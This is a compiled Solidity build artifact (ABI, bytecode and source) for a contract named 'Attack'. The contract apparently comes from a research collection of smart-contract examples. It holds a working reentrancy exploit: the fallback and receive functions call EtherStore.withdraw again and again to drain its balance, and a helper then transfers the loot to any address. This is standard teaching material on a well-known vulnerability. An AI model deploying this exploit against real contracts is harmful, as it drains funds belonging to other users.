{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "counter",
          "type": "uint256"
        }
      ],
      "name": "Logger",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "addressToSend",
          "type": "address"
        }
      ],
      "name": "transferToaddress",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000805534801561001457600080fd5b5060405161095a38038061095a833981810160405281019061003691906100e0565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ad82610082565b9050919050565b6100bd816100a2565b81146100c857600080fd5b50565b6000815190506100da816100b4565b92915050565b6000602082840312156100f6576100f561007d565b5b6000610104848285016100cb565b91505092915050565b61083e8061011c6000396000f3fe6080604052600436106100435760003560e01c806312065fe0146102865780635ad8e8ae146102b15780639e5faafc146102cd578063acd2e6e5146102d757610167565b3661016757670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101655760016000808282546100a2919061050d565b925050819055507f258353b5cf06d77119068bca569637d802c13175693ca7387cd31e6fc0bee5646000546040516100da91906105cf565b60405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014c57600080fd5b505af1158015610160573d6000803e3d6000fd5b505050505b005b670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106102845760016000808282546101c1919061050d565b925050819055507f258353b5cf06d77119068bca569637d802c13175693ca7387cd31e6fc0bee5646000546040516101f99190610649565b60405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026b57600080fd5b505af115801561027f573d6000803e3d6000fd5b505050505b005b34801561029257600080fd5b5061029b610302565b6040516102a89190610677565b60405180910390f35b6102cb60048036038101906102c691906106f5565b61030a565b005b6102d5610354565b005b3480156102e357600080fd5b506102ec6104ae565b6040516102f99190610781565b60405180910390f35b600047905090565b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610350573d6000803e3d6000fd5b5050565b670de0b6b3a764000034101561039f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610396906107e8565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561041157600080fd5b505af1158015610425573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561049457600080fd5b505af11580156104a8573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610518826104d4565b9150610523836104d4565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610558576105576104de565b5b828201905092915050565b600082825260208201905092915050565b7f526563696576652041747461636b202100000000000000000000000000000000600082015250565b60006105aa601083610563565b91506105b582610574565b602082019050919050565b6105c9816104d4565b82525050565b600060408201905081810360008301526105e88161059d565b90506105f760208301846105c0565b92915050565b7f46616c6c6261636b2041747461636b2021000000000000000000000000000000600082015250565b6000610633601183610563565b915061063e826105fd565b602082019050919050565b6000604082019050818103600083015261066281610626565b905061067160208301846105c0565b92915050565b600060208201905061068c60008301846105c0565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006106c282610697565b9050919050565b6106d2816106b7565b81146106dd57600080fd5b50565b6000813590506106ef816106c9565b92915050565b60006020828403121561070b5761070a610692565b5b6000610719848285016106e0565b91505092915050565b6000819050919050565b600061074761074261073d84610697565b610722565b610697565b9050919050565b60006107598261072c565b9050919050565b600061076b8261074e565b9050919050565b61077b81610760565b82525050565b60006020820190506107966000830184610772565b92915050565b7f4d6f7265207468616e2031206574686572206e65656465640000000000000000600082015250565b60006107d2601883610563565b91506107dd8261079c565b602082019050919050565b60006020820190508181036000830152610801816107c5565b905091905056fea2646970667358221220b86f3cda2217e3452339a1a7d6d2ec7bebcf5ebfc5a19dbec2c4146c356d919364736f6c63430008090033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.4.2 <0.9.0;\n\nimport \"./EtherStore.sol\";\n\ncontract Attack {\n    uint256 counter = 0;\n    EtherStore public etherStore;\n    event Logger(string message, uint256 counter);\n    \n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            emit Logger(\"Fallback Attack !\", counter);\n            etherStore.withdraw();\n        }\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            emit Logger(\"Recieve Attack !\", counter);\n            etherStore.withdraw();\n        }\n    }\n    \n    function attack() external payable {\n        require(msg.value >= 1 ether, \"More than 1 ether needed\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function transferToaddress(address payable addressToSend) public payable {\n        addressToSend.transfer(address(this).balance);\n    }\n}\n",
  "sourcePath": "/home/clustfuzz/Documents/Research/Smart Contracts Project/Solidity-Examples/contract-samples/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.9+commit.e5eed63a.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-01-16T13:15:33.182Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}